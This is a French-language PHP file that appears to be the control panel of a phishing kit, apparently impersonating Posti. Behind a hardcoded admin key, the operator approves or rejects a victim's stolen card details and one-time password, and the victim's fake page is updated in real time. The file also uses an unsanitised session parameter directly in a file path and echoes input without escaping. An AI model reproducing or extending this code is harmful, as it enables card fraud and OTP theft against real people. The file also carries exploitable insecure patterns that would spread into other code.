<?php
if (!defined('ROOT')) die('403');

// Admin key check
$adminKey = 'PostiAdmin2024';
$providedKey = $_GET['key'] ?? '';

if ($providedKey !== $adminKey) {
    die('Accès refusé');
}

// Get parameters
$sessionId = $_GET['session'] ?? '';
$type = $_GET['type'] ?? ''; // cc or otp
$action = $_GET['act'] ?? ''; // approve or reject

if (empty($sessionId) || empty($type) || empty($action)) {
    die('Paramètres manquants');
}

// Status directory
$statusDir = __DIR__ . '/status';
$statusFile = "$statusDir/$sessionId.txt";

// Determine new status
if ($action === 'approve') {
    $newStatus = "approved_{$type}";
    $message = $type === 'cc' ? '✅ Carte approuvée! L\'utilisateur va recevoir l\'OTP.' : '✅ OTP approuvé! Paiement validé.';
} else {
    $newStatus = "rejected_{$type}";
    $message = $type === 'cc' ? '❌ Carte refusée!' : '❌ OTP refusé!';
}

// Write status to file
file_put_contents($statusFile, $newStatus);

// Log action
$logsDir = __DIR__ . '/logs';
if (!is_dir($logsDir)) {
    mkdir($logsDir, 0755, true);
}
$logData = date('Y-m-d H:i:s') . " | Action: $action | Type: $type | Session: $sessionId | Status: $newStatus\n";
@file_put_contents("$logsDir/actions.log", $logData, FILE_APPEND | LOCK_EX);

// Display confirmation page
?><!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Action effectuée</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#f5f7fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);padding:40px;max-width:400px;width:100%;text-align:center}
.icon{width:80px;height:80px;margin:0 auto 20px;border-radius:50%;display:flex;align-items:center;justify-content:center}
.icon.success{background:#d4edda}
.icon.error{background:#f8d7da}
.icon svg{width:40px;height:40px}
.icon.success svg{fill:#155724}
.icon.error svg{fill:#721c24}
h1{font-size:20px;color:#2A2B2D;margin-bottom:12px}
p{color:#666;font-size:14px;line-height:1.5;margin-bottom:20px}
.info{background:#f8f9fa;border-radius:8px;padding:12px;font-size:13px;color:#666;margin-top:20px}
.btn{display:inline-block;background:#FF6200;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;font-weight:600;margin-top:16px}
.btn:hover{background:#e55500}
</style>
</head>
<body>
<div class="box">
    <div class="icon <?php echo $action === 'approve' ? 'success' : 'error'; ?>">
        <?php if ($action === 'approve'): ?>
        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        <?php else: ?>
        <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        <?php endif; ?>
    </div>

    <h1><?php echo htmlspecialchars($message); ?></h1>
    <p>L'action a été enregistrée avec succès.</p>

    <div class="info">
        <strong>Session:</strong> <?php echo htmlspecialchars($sessionId); ?><br>
        <strong>Type:</strong> <?php echo strtoupper($type); ?><br>
        <strong>Action:</strong> <?php echo ucfirst($action); ?><br>
        <strong>Heure:</strong> <?php echo date('d/m/Y H:i:s'); ?>
    </div>

    <p style="margin-top:20px;font-size:12px;color:#999">Vous pouvez fermer cette page</p>
</div>
</body>
</html>
